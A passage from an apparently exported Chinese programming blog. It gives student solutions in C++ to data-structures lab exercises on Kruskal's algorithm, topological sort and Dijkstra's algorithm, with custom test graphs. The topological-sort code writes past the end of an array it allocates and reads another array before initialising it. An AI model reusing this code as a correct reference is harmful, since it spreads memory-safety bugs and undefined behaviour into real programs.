class="keyword">if</span> (p-&gt;vertex &gt; i) &#123;</span><br><span class="line">                edges[index].vAdj = i;</span><br><span class="line">                edges[index].vertex = p-&gt;vertex;</span><br><span class="line">                edges[index].weight = p-&gt;weight;</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num_e; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; num_e; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (edges[i].weight &gt; edges[j].weight) &#123;</span><br><span class="line">                EdgeNode temp = edges[i];</span><br><span class="line">                edges[i] = edges[j];</span><br><span class="line">                edges[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; num_e &amp;&amp; j &lt; num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">set</span>[edges[i].vAdj] != <span class="built_in">set</span>[edges[i].vertex]) &#123;</span><br><span class="line">            sum += edges[i].weight;</span><br><span class="line">            begin = <span class="built_in">set</span>[edges[i].vAdj];</span><br><span class="line">            end = <span class="built_in">set</span>[edges[i].vertex];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= num_v; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">set</span>[k] == end)</span><br><span class="line">                    <span class="built_in">set</span>[k] = begin;</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">delete</span>[] <span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] edges;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-析构函数"><a href="#0x06-析构函数" class="headerlink" title="0x06 析构函数"></a>0x06 析构函数</h1><p>逐个结点释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::~Graph()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">            EdgeNode* temp = VexList[i].firstAdj;</span><br><span class="line">            VexList[i].firstAdj = temp-&gt;next;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] VexList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x07-补充"><a href="#0x07-补充" class="headerlink" title="0x07 补充"></a>0x07 补充</h1><p>由于题目给出的样例图极其特殊，包括但不限于边数过少、边权值大量重复等，以至于你很容易<code>pass check point!</code>而不能发现自身算法的缺陷与不足。</p>
<p>所以我<strong>强烈建议</strong>自行增加测试样例，下面有三个样例可供参考。</p>
<h2 id="g1"><a href="#g1" class="headerlink" title="g1"></a>g1</h2><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/11g1.png" alt="11g1"></p>
<p>（顶点<code>A</code>～<code>G</code>分别对应<code>1</code>～<code>7</code>）</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g1</span><span class="params">(<span class="number">7</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line">g1.addedge(<span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">g1.addedge(<span class="number">4</span>, <span class="number">5</span>, <span class="number">15</span>);</span><br><span class="line">g1.addedge(<span class="number">4</span>, <span class="number">6</span>, <span class="number">6</span>);</span><br><span class="line">g1.addedge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>);</span><br><span class="line">g1.addedge(<span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line">g1.addedge(<span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(g1.prim() == <span class="number">39</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 3!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span>(g1.kruskal() == <span class="number">39</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 4!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h2 id="g2"><a href="#g2" class="headerlink" title="g2"></a>g2</h2><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/11g2.png" alt="11g2"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g2</span><span class="params">(<span class="number">6</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g2.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">g2.addedge(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">g2.addedge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">g2.addedge(<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">g2.addedge(<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>);</span><br><span class="line">g2.addedge(<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">g2.addedge(<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">g2.addedge(<span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">g2.addedge(<span class="number">4</span>, <span class="number">6</span>, <span class="number">2</span>);</span><br><span class="line">g2.addedge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(g2.prim() == <span class="number">15</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 5!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span>(g2.kruskal() == <span class="number">15</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 6!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h2 id="g3"><a href="#g3" class="headerlink" title="g3"></a>g3</h2><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/11g3.png" alt="11g3"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g3</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g3.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">g3.addedge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">g3.addedge(<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>);</span><br><span class="line">g3.addedge(<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">g3.addedge(<span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">g3.addedge(<span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>);</span><br><span class="line">g3.addedge(<span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>);</span><br><span class="line">g3.addedge(<span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>);</span><br><span class="line">g3.addedge(<span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line">g3.addedge(<span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line">g3.addedge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>);</span><br><span class="line">g3.addedge(<span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>);</span><br><span class="line">g3.addedge(<span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>);</span><br><span class="line">g3.addedge(<span class="number">6</span>, <span class="number">9</span>, <span class="number">9</span>);</span><br><span class="line">g3.addedge(<span class="number">6</span>, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">g3.addedge(<span class="number">7</span>, <span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">g3.addedge(<span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>);</span><br><span class="line">g3.addedge(<span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>);</span><br><span class="line">g3.addedge(<span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>);</span><br><span class="line">g3.addedge(<span class="number">9</span>, <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(g3.prim() == <span class="number">38</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 7!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span>(g3.kruskal() == <span class="number">38</span>) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pass check point 8!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会「拓扑排序」？</title>
    <url>/Data-Structures-Experiment-12/</url>
    <content><![CDATA[<p>Data Structures Experiment #12 - 完成图形类中拓扑排序的算法</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>完善给出的Graph类。</p>
<ul>
<li><code>Graph(int max_v);</code><br>构造函数，max_v 是顶点的个数。</li>
<li><code>～Graph();</code><br>析构函数，释放分配的空间。</li>
<li><code>void addedge(int s, int t, int w);</code><br>添加一条从s到t，权重为w的有向边。</li>
<li><code>int getV();</code><br>获得图中顶点的个数。</li>
<li><code>int* topological();</code><br>获取图的拓扑排序顺序。例如，图结构为:<br>1 -&gt; 2     1 -&gt; 3     2 -&gt; 3<br>拓扑排序结果为  [1, 2, 3]</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>与<a href="https://www.superpung.xyz/Data-Structures-Experiment-10/">#10</a>基本相同。</p>
<p>增加了<code>inDegree</code>数组以存放各顶点入度，<code>result_topology</code>数组以存放拓扑排序生成的序列。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> vertex;</span><br><span class="line">        <span class="keyword">int</span> weight;</span><br><span class="line">        EdgeNode* next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VertexNode</span> &#123;</span></span><br><span class="line">        EdgeNode* firstAdj;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    VertexNode* VexList;</span><br><span class="line">    <span class="keyword">int</span>* inDegree;</span><br><span class="line">    <span class="keyword">int</span>* result_topology;</span><br><span class="line">    <span class="keyword">int</span> num_v;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>与前两次基本相同。</p>
<p>初始化入度数组为0。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::Graph(<span class="keyword">int</span> max_v)&#123;</span><br><span class="line">    num_v = max_v;</span><br><span class="line">    VexList = <span class="keyword">new</span> VertexNode[num_v + <span class="number">1</span>];</span><br><span class="line">    inDegree = <span class="keyword">new</span> <span class="keyword">int</span>[num_v + <span class="number">1</span>];</span><br><span class="line">    result_topology = <span class="keyword">new</span> <span class="keyword">int</span>[num_v];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        VexList[i].firstAdj = <span class="literal">NULL</span>;</span><br><span class="line">        inDegree[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-addedge"><a href="#0x02-addedge" class="headerlink" title="0x02 addedge"></a>0x02 addedge</h1><p>与<a href="https://www.superpung.xyz/Data-Structures-Experiment-10/">#10</a>基本相同。</p>
<p>增加终点的入度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Graph::addedge</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t, <span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    EdgeNode* newEdge = <span class="keyword">new</span> EdgeNode;</span><br><span class="line">    newEdge-&gt;weight = w;</span><br><span class="line">    newEdge-&gt;vertex = t;</span><br><span class="line"></span><br><span class="line">    newEdge-&gt;next = VexList[s].firstAdj;</span><br><span class="line">    VexList[s].firstAdj = newEdge;</span><br><span class="line"></span><br><span class="line">    inDegree[t]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-getV"><a href="#0x03-getV" class="headerlink" title="0x03 getV"></a>0x03 getV</h1><p>判断出度和入度不同时为零。</p>
<p>注意此处入度的判断用到了<code>inDegree</code>数组，后续操作不可更改<code>inDegree</code>数组，如需更改应先拷贝。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Graph::getV</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (VexList[i].firstAdj || inDegree[i])</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-topological"><a href="#0x04-topological" class="headerlink" title="0x04 topological"></a>0x04 topological</h1><p>先得到顶点数<code>count</code>，再创建<code>topology</code>数组作为存储入度为0顶点的<strong>栈</strong>，再拷贝<code>inDegree</code>数组。</p>
<p><code>index</code>作为栈顶指针，<code>index_r</code>记录最终生成拓扑序列的大小。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> count = getV();</span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> index_r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"><span class="keyword">int</span>* topology = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line"><span class="keyword">int</span>* inDeg = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">    inDeg[i] = inDegree[i];</span><br></pre></td></tr></table></figure>
<p>当生成的拓扑序列大小未达到顶点总数时，不断循环。</p>
<p>每次循环中，首先寻找入度为零的顶点并压入栈。如果已在栈中或曾经入栈已被弹出，则不必再次入栈。</p>
<p>入栈时，将栈顶指针之上的全部顶点上移（等价于<strong>将其弹出栈</strong>的效果），再将待入栈的顶点置于栈顶指针处，指针上移。</p>
<p>当前所有入度为零的顶点均已入栈后，将栈顶指针下最上方的顶点弹出（指针下移），并将其存入拓扑序列，序列大小加1。</p>
<p>注意到以上将顶点弹出栈的操作被分解为两步进行。</p>
<p>将弹出的顶点所发出的边全部删除，即对应所有终点的入度减1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (index_r &lt; count) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!inDeg[i]) &#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == topology[j])</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j == count) &#123;</span><br><span class="line">                <span class="keyword">if</span> (index_r) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (k = count - <span class="number">1</span>; k &gt; index; k--)</span><br><span class="line">                        topology[k] = topology[k - <span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                topology[index++] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">result_topology[index_r++] = topology[--index];</span><br><span class="line"></span><br><span class="line">    EdgeNode* p = VexList[result_topology[index_r - <span class="number">1</span>]].firstAdj;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        inDeg[p-&gt;vertex]--;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后释放内存并返回结果。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span>[] topology;</span><br><span class="line"><span class="keyword">delete</span>[] inDeg;</span><br><span class="line"><span class="keyword">return</span> result_topology;</span><br></pre></td></tr></table></figure>
<p>完整算法如下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">Graph::topological</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = getV();</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> index_r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span>* topology = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line">    <span class="keyword">int</span>* inDeg = <span class="keyword">new</span> <span class="keyword">int</span>[count];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= num_v; i++)</span><br><span class="line">        inDeg[i] = inDegree[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (index_r &lt; count) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!inDeg[i]) &#123;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == topology[j])</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (j == count) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (index_r) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (k = count - <span class="number">1</span>; k &gt; index; k--)</span><br><span class="line">                            topology[k] = topology[k - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    topology[index++] = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result_topology[index_r++] = topology[--index];</span><br><span class="line"></span><br><span class="line">        EdgeNode* p = VexList[result_topology[index_r - <span class="number">1</span>]].firstAdj;</span><br><span class="line">        <span class="keyword">while</span> (p) &#123;</span><br><span class="line">            inDeg[p-&gt;vertex]--;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] topology;</span><br><span class="line">    <span class="keyword">delete</span>[] inDeg;</span><br><span class="line">    <span class="keyword">return</span> result_topology;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-析构函数"><a href="#0x05-析构函数" class="headerlink" title="0x05 析构函数"></a>0x05 析构函数</h1><p>逐结点释放内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::~Graph()&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (VexList[i].firstAdj) &#123;</span><br><span class="line">            EdgeNode* temp = VexList[i].firstAdj;</span><br><span class="line">            VexList[i].firstAdj = temp-&gt;next;</span><br><span class="line">            <span class="keyword">delete</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] VexList;</span><br><span class="line">    <span class="keyword">delete</span>[] inDegree;</span><br><span class="line">    <span class="keyword">delete</span>[] result_topology;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-补充"><a href="#0x06-补充" class="headerlink" title="0x06 补充"></a>0x06 补充</h1><p>建议增加测试样例，现提供两个如下。</p>
<h2 id="g1"><a href="#g1" class="headerlink" title="g1"></a>g1</h2><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/12g1.jpeg" alt="12g1"></p>
<p>顶点0～5依次换成1～6。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g1</span><span class="params">(<span class="number">6</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">g1.addedge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line">g1.addedge(<span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>);</span><br><span class="line">g1.addedge(<span class="number">3</span>, <span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">g1.addedge(<span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">g1.addedge(<span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">g1.addedge(<span class="number">5</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">g1.addedge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len1 = g1.getV();</span><br><span class="line"><span class="keyword">int</span> *arr1 = g1.topological();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r_arr1[<span class="number">6</span>] = &#123;<span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(len1 == <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 3!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; len1; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr1[j] != r_arr1[j]) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == len1) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 4!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h2 id="g2"><a href="#g2" class="headerlink" title="g2"></a>g2</h2><p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/12g2.png" alt="12g2"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Graph <span class="title">g2</span><span class="params">(<span class="number">5</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">g2.addedge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">g2.addedge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line">g2.addedge(<span class="number">2</span>, <span class="number">4</span>, <span class="number">10</span>);</span><br><span class="line">g2.addedge(<span class="number">3</span>, <span class="number">5</span>, <span class="number">10</span>);</span><br><span class="line">g2.addedge(<span class="number">4</span>, <span class="number">3</span>, <span class="number">10</span>);</span><br><span class="line">g2.addedge(<span class="number">4</span>, <span class="number">5</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len2 = g2.getV();</span><br><span class="line"><span class="keyword">int</span> *arr2 = g2.topological();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r_arr2[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(len2 == <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 5!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; len2; k++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(arr2[k] != r_arr2[k]) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(k == len2) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pass check point 6!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Experiments</tag>
        <tag>Data Structures</tag>
      </tags>
  </entry>
  <entry>
    <title>还不知道 Dijkstra 算法？</title>
    <url>/Data-Structures-Experiment-13/</url>
    <content><![CDATA[<p>Data Structures Experiment #13 - 完成Dijkstra算法，实现单源最短路的求法（邻接表表示）</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>完善给出的Graph类。</p>
<ul>
<li><code>Graph(int max_v);</code><br>构造函数，max_v 是顶点的个数。</li>
<li><code>～Graph();</code><br>析构函数，释放分配的空间。</li>
<li><code>void addedge(int s, int t, int w);</code><br>添加一条从s到t，权重为w的有向边。</li>
<li><code>int getV();</code><br>获得图中顶点的个数。</li>
<li><code>int* dijkstra();</code><br>获取从1出发的单源最短路数组。如果某个点无法到达则长度为-1。</li>
</ul>
</blockquote>
<h1 id="0x00-数据域封装"><a href="#0x00-数据域封装" class="headerlink" title="0x00 数据域封装"></a>0x00 数据域封装</h1><p>与<a href="https://www.superpung.xyz/Data-Structures-Experiment-12/">#12</a>基本相同。</p>
<p>增加了<code>inDegree</code>数组以存放各顶点入度，<code>dij</code>数组以存放dijkstra算法生成的单源最短路数组：<code>dij[i]</code>代表顶点<code>1</code>到顶点<code>i</code>的最短路权。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">EdgeNode</span> &#123;</span></span><br><span class="line">        <span class="keyword">int</span> dest;</span><br><span class="line">        <span class="keyword">int</span> cost;</span><br><span class="line">        EdgeNode* next;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">VertexNode</span> &#123;</span></span><br><span class="line">        EdgeNode* firstAdj;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    VertexNode* VexList;</span><br><span class="line">    <span class="keyword">int</span>* inDegree;</span><br><span class="line">    <span class="keyword">int</span>* dij;</span><br><span class="line">    <span class="keyword">int</span> num_v;</span><br></pre></td></tr></table></figure>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>与前三次基本相同。</p>
<p>初始化<code>dij[1]</code>为0，其他均为<code>-1</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Graph::Graph(<span class="keyword">int</span> max_v)&#123;</span><br><span class="line">    num_v = max_v;</span><br><span class="line">    VexList = <span class="keyword">new</span> VertexNode[num_v + <span class="number">1</span>];</span><br><span class="line">    inDegree = <span class="keyword">new</span> <span class="keyword">int</span>[num_v + <span class="number">1</span>];</span><br><span class="line">    dij = <span class="keyword">new</span> <span class="keyword">int</span>[num_v + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= num_v; i++) &#123;</span><br><span class="line">        VexList[i].firstAdj = <span class="literal">NULL</span>;</span><br><span class="line">        inDegree[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">1</span>)</span><br><span class="line">            dij[i] = <span 